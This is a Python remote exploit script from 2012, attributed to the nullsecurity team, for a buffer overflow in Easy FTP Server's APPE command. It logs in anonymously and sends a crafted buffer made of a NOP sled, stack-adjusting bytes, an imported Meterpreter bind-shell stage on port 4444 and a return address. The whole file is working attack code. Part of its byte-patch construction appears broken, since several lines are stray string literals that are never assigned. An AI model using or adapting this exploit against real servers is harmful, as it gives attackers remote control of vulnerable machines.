#!/usr/bin/env python
# -*- coding: latin-1 -*- # ####################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ nullsecurity team           #
#                                                                              #
# Easy FTP server remote exploit                                               #
#                                                                              #
# DATE                                                                         #
# 03/03/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# Easy FTP Server - "APPE" command buffer overflow - remote exploit            #
#                                                                              #
# AUTHOR                                                                       #
# Swappage - http://www.nullsecurity.net/                                      #
#                                                                              #
################################################################################

import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
    username = b"anonymous"
    password = b"a@a"
    hostname = target_machine
    port = target_port

    #009BFE69   <--- where to go
    #009BFC6C   <--- value of ESP
    # increment ESP and add patch to that memory location

    patch=b"\xcc"
    "\x89\xe3"
    "\x83\xc4\x5a"
    "\x83\xc4\x5a"
    "\x83\xc4\x5a"
    "\x83\xc4\x5a"
    "\x83\xc4\x5a"
    "\x83\xc4\x3b"
    "\xc7\x04\x24\xd8\xd1\xec\xf7"
    "\x89\xdc"
    "\x31\xdb"
    

    #
    #shellcode: windows/meterpreter/bind_tcp on port 4444
    #
    stage1=buf
    #patch=("\xd8\xd1\xec\xf7")
    
    #009BFD5D   where to jmp
    buffer = b"\x90" * (258 - (len(patch) + len(stage1))) + patch + b"\x90"*10 + stage1 + b"\x5d\xfd\x9b\x00"  + b"\x90" * 50

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    ## Connects and receives the banner
    s.connect((hostname, port))
    a = s.recv(1024)
   
    s.send(b"user " + username + b"\r\n")
    a =s.recv(1024)
    
    s.send(b"pass " + password + b"\r\n")
    a = s.recv(1024)
   
    s.send(b"APPE " + buffer + b"\r\n")
    s.close()

    # EOF